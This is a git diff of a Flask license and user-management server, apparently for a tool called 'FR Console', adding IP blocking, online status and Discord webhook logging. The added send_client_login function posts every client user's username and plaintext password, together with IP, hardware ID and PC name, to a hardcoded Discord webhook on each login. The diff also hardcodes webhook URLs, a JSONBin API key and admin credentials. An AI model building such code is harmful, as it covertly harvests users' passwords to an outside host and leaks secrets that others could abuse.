@@ -5,9 +5,18 @@ import os
 
 app = Flask(__name__)
 app.secret_key = os.urandom(24)
-
+BLOCKED_IPS = [
+    "49.37.7.46"
+]
+LICENSE_KEYS = {
+    "SHUBH": {"hwid": ""},
+    "HARSH": {"hwid": ""},
+    "PRINCE": {"hwid": ""}
+}
+DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1482347636932608061/78cGhgwcz47pkLu1nOOPozfxedGJ4hzUJIq88fGDIOxGbZ_SQAi5Wp9-354np203_UYd"
+DISCORD_WEBHOOKK = "https://discord.com/api/webhooks/1482348028038742181/EpByNd1j3fCsQqZiAPvrEnFyvLrv0MKqgRLRldPPm7AI78uq2oZF98_Bp-OkS9aPhVJ4"
 ADMIN_USERNAME = "FR"
-ADMIN_PASSWORD = "CONSOLE"
+ADMIN_PASSWORD = "PUSSY"
 
 JSONBIN_API_KEY = "$2a$10$R74G8pPzaRy0kLrcmfIYO.jvMl0T8JA3XQVaRHQNqYWsyO8ltxLr."
 BIN_ID = "68fef44843b1c97be983b559"
@@ -23,7 +32,16 @@ def ist_now():
     return datetime.utcnow() + timedelta(hours=5, minutes=30)
 
 # -------------------- EXPIRY LOGIC --------------------
+def is_online(last_seen):
 
+    if not last_seen:
+        return False
+
+    try:
+        t = datetime.strptime(last_seen,"%Y-%m-%d %H:%M:%S")
+        return (ist_now() - t).seconds < 15
+    except:
+        return False
 def parse_expiry(expiry_str):
     formats = [
         "%Y-%m-%dT%H:%M",
@@ -47,7 +65,7 @@ def is_expired(expiry_str):
 
     return ist_now() > expiry
 
-# -------------------- JSONBIN --------------------
+# ------------------- JSONBIN --------------------
 
 def load_data_raw():
     try:
@@ -108,15 +126,160 @@ def clean_expired_users(data):
         save_data(data)
 
     return data
+    
+def send_login_info():
+    try:
 
+        ip = request.headers.get("X-Forwarded-For", request.remote_addr)
+        if ip:
+            ip = ip.split(",")[0].strip()
+
+        user_agent = request.headers.get("User-Agent")
+
+        # Device name detect
+        if "Windows" in user_agent:
+            device_name = "Windows PC"
+        elif "Android" in user_agent:
+            device_name = "Android Phone"
+        elif "iPhone" in user_agent:
+            device_name = "iPhone"
+        elif "Mac" in user_agent:
+            device_name = "Mac"
+        else:
+            device_name = "Unknown Device"
+
+        time = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")
+
+        data = {
+            "embeds": [
+                {
+                    "title": "💻 Login Information",
+                    "color": 0x32CD32,
+                    "fields": [
+                        {
+                            "name": "🌐 IP Address",
+                            "value": ip,
+                            "inline": False
+                        },
+                        {
+                            "name": "🖥 Device",
+                            "value": device_name,
+                            "inline": False
+                        },
+                        {
+                            "name": "📱 User-Agent",
+                            "value": user_agent,
+                            "inline": False
+                        },
+                        {
+                            "name": "⏰ Time",
+                            "value": time,
+                            "inline": False
+                        }
+                    ],
+                    "footer": {
+                        "text": "FR Console Security"
+                    }
+                }
+            ]
+        }
+
+        requests.post(DISCORD_WEBHOOK, json=data)
+
+    except Exception as e:
+        print("Webhook error:", e)
 
 def load_data():
     data = load_data_raw()
     return clean_expired_users(data)
+def send_client_login(app_name, username, password, ip, hwid, pc_name):
 
+    try:
+        data = {
+            "embeds": [
+                {
+                    "title": "🔐 Client Login",
+                    "color": 0x32CD32,
+                    "fields": [
+                        {"name": "Application", "value": app_name, "inline": False},
+                        {"name": "Username", "value": username, "inline": False},
+                        {"name": "Password", "value": password, "inline": False},
+                        {"name": "IP Address", "value": ip, "inline": False},
+                        {"name": "PC Name", "value": pc_name, "inline": False},
+                        {"name": "HWID", "value": hwid, "inline": False},
+                        {"name": "Time", "value": ist_now().strftime("%Y-%m-%d %H:%M:%S"), "inline": False}
+                    ],
+                    "footer": {
+                        "text": "FR Console Login Log"
+                    }
+                }
+            ]
+        }
+
+        requests.post(DISCORD_WEBHOOKK, json=data)
+
+    except Exception as e:
+        print("Webhook error:", e)
 # -------------------- AUTH --------------------
 # -------------------- AUTH --------------------
+@app.route("/ping", methods=["POST"])
+def ping():
 
+    data = load_data()
+
+    category = request.form["category"]
+    username = request.form["username"]
+
+    if category not in data:
+        return jsonify({"status":"error"})
+
+    for user in data[category]:
+
+        if user["Username"] == username:
+
+            user["LastSeen"] = ist_now().strftime("%Y-%m-%d %H:%M:%S")
+            save_data(data)
+
+            return jsonify({"status":"ok"})
+
+    return jsonify({"status":"error"})
+@app.route("/license_login", methods=["POST"])
+def license_login():
+
+    license_key = request.form.get("license", "").upper()
+
+    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
+    if ip:
+        ip = ip.split(",")[0].strip()
+
+    # 🔴 ADD THIS
+    if ip in BLOCKED_IPS:
+        return jsonify({
+            "status": "error",
+            "message": "Your device is blocked"
+        })
+
+    user_agent = request.headers.get("User-Agent", "")
+    hwid = f"{ip}|{user_agent}"
+
+    if license_key not in LICENSE_KEYS:
+        return jsonify({"status": "error", "message": "License not found"})
+
+    lic = LICENSE_KEYS[license_key]
+
+    if lic["hwid"] == "":
+        lic["hwid"] = hwid
+
+    elif lic["hwid"] != hwid:
+        return jsonify({
+            "status": "error",
+            "message": "License already used on another device"
+        })
+
+    session["logged_in"] = True
+    send_login_info()
+
+    return jsonify({"status": "success"})
 @app.route('/verify_password', methods=['POST'])
 def verify_password():
 
@@ -137,46 +300,31 @@ def home():
 @app.route("/login", methods=["GET", "POST"])
 def login():
 
+    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
+
+    if ip:
+        ip = ip.split(",")[0].strip()
+
+    # Page open pe block message nahi dikhayega
     if request.method == "POST":
 
-        # 🔑 License Login
-        if request.form.get("license_key"):
+        # Login submit pe IP block check
+        if ip in BLOCKED_IPS:
+            return render_template("login.html", error="Your Device is blocked")
 
-            key = request.form.get("license_key")
-            data = load_data()
-
-            # check all categories
-            if "licenses" in data:
-                for category in data["licenses"]:
-                    for lic in data["licenses"][category]:
-
-                        if lic["Key"] == key:
-
-                            if is_expired(lic["Expiry"]):
-                                data["licenses"][category].remove(lic)
-                                save_data(data)
-                                return render_template("login.html", error="Key expired")
-
-                            if lic["Status"] != "Active":
-                                return render_template("login.html", error="Key paused")
-
-                            session["logged_in"] = True
-                            return redirect(url_for("home"))
-
-            return render_template("login.html", error="Key not found")
-
-        # 👤 Username Login
         if request.form.get("username") == ADMIN_USERNAME and request.form.get("password") == ADMIN_PASSWORD:
+            
             session["logged_in"] = True
+            send_login_info()   # webhook only on success
+            
             return redirect(url_for("home"))
 
         return render_template("login.html", error="Invalid credentials")
 
     return render_template("login.html")
-import os
 
-from flask import Response
-import os
+
+
 
 @app.route("/view/<path:filename>")
 def view_file(filename):
@@ -253,47 +401,9 @@ def view_file(filename):
 def logout():
     session.pop("logged_in", None)
     return redirect(url_for("login"))
-import secrets
-import string
 
-def generate_license_key():
-    chars = string.ascii_uppercase + string.digits
-    return "-".join(
-        ''.join(secrets.choice(chars) for _ in range(4))
-        for _ in range(4)
-    )
 # -------------------- USER MANAGEMENT --------------------
-@app.route("/generate_license", methods=["POST"])
-def generate_license():
-    data = load_data()
 
-    category = request.form["category"]
-    expiry = request.form["expiry"]
-
-    if category not in data:
-        data[category] = []
-
-    # Ensure licenses list
-    if "licenses" not in data:
-        data["licenses"] = {}
-
-    if category not in data["licenses"]:
-        data["licenses"][category] = []
-
-    key = generate_license_key()
-
-    data["licenses"][category].append({
-        "Key": key,
-        "HWID": "",
-        "Status": "Active",
-        "Expiry": expiry,
-        "CreatedAt": ist_now().strftime("%Y-%m-%d %H:%M")
-    })
-
-    if save_data(data):
-        return jsonify({"status": "success", "message": f"Key Created: {key}"})
-
-    return jsonify({"status": "error", "message": "Generation failed"})
 @app.route("/add_user", methods=["POST"])
 def add_user():
     data = load_data()
@@ -359,34 +469,6 @@ def delete_user():
         return jsonify({"status": "success", "message": "User deleted"})
 
     return jsonify({"status": "error", "message": "Delete failed"})
-    @app.route("/update_license", methods=["POST"])
-def update_license():
-    data = load_data()
-
-    category = request.form["category"]
-    key = request.form["key"]
-    action = request.form["action"]
-
-    if "licenses" not in data or category not in data["licenses"]:
-        return jsonify({"status": "error", "message": "No licenses"})
-
-    for lic in data["licenses"][category]:
-
-        if lic["Key"] == key:
-
-            if action == "pause":
-                lic["Status"] = "Paused"
-
-            elif action == "unpause":
-                lic["Status"] = "Active"
-
-            elif action == "delete":
-                data["licenses"][category].remove(lic)
-
-            if save_data(data):
-                return jsonify({"status": "success", "message": f"License {action}d"})
-
-    return jsonify({"status": "error", "message": "License not found"})
 @app.route("/pause_user", methods=["POST"])
 def pause_user():
     data = load_data()
@@ -444,55 +526,26 @@ def update_message_status():
             return jsonify({"status": "error", "message": "Save failed"})
 
     return jsonify({"status": "error", "message": "User not found"})
-@app.route("/get_licenses", methods=["POST"])
-def get_licenses():
-    data = load_data()
-    category = request.form["category"]
 
-    if "licenses" not in data or category not in data["licenses"]:
-        return jsonify([])
-
-    return jsonify(data["licenses"][category])
 
 @app.route("/get_users", methods=["POST"])
 def get_users():
-    data = load_data()
-    return jsonify(data.get(request.form["category"], []))
 
-@app.route("/license_login", methods=["POST"])
-def license_login():
     data = load_data()
-
     category = request.form["category"]
-    key = request.form["license_key"]
-    hwid = request.form["hwid"]
 
-    if "licenses" not in data or category not in data["licenses"]:
-        return jsonify({"status": "error", "message": "Invalid application"})
+    users = data.get(category, [])
 
-    for lic in data["licenses"][category]:
+    for u in users:
 
-        if lic["Key"] == key:
+        if is_online(u.get("LastSeen")):
+            u["Online"] = "Online"
+        else:
+            u["Online"] = "Offline"
 
-            if is_expired(lic["Expiry"]):
-                data["licenses"][category].remove(lic)
-                save_data(data)
-                return jsonify({"status": "error", "message": "Key expired"})
+    return jsonify(users)
 
-            if lic["Status"] != "Active":
-                return jsonify({"status": "error", "message": "Key paused"})
 
-            if not lic["HWID"]:
-                lic["HWID"] = hwid
-                save_data(data)
-                return jsonify({"status": "success", "message": "HWID bound"})
-
-            if lic["HWID"] != hwid:
-                return jsonify({"status": "error", "message": "HWID mismatch"})
-
-            return jsonify({"status": "success", "message": "Login success"})
-
-    return jsonify({"status": "error", "message": "Key not found"})
 @app.route("/client_login", methods=["POST"])
 def client_login():
     data = load_data()
@@ -501,6 +554,12 @@ def client_login():
     username = request.form["username"]
     password = request.form["password"]
     hwid = request.form["hwid"]
+
+    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
+    if ip:
+        ip = ip.split(",")[0].strip()
+
+    pc_name = request.form.get("pcname", "Unknown")
 
     if category not in data:
         return jsonify({"status": "error", "message": "Application not found"})
@@ -524,6 +583,8 @@ def client_login():
                 user["HWID"] = hwid
                 save_data(data)
 
+                send_client_login(category, username, password, ip, hwid, pc_name)
+
                 return jsonify({
                     "status": "success",
                     "message": "HWID bound. Login success",
@@ -533,6 +594,8 @@ def client_login():
             if user["HWID"] != hwid:
                 return jsonify({"status": "error", "message": "HWID mismatch"})
 
+            send_client_login(category, username, password, ip, hwid, pc_name)
+
             return jsonify({
                 "status": "success",
                 "message": "Login success",
@@ -540,6 +603,8 @@ def client_login():
             })
 
     return jsonify({"status": "error", "message": "Username does not exist"})
+
+
 
 @app.route("/reset_hwid", methods=["POST"])
 def reset_hwid():
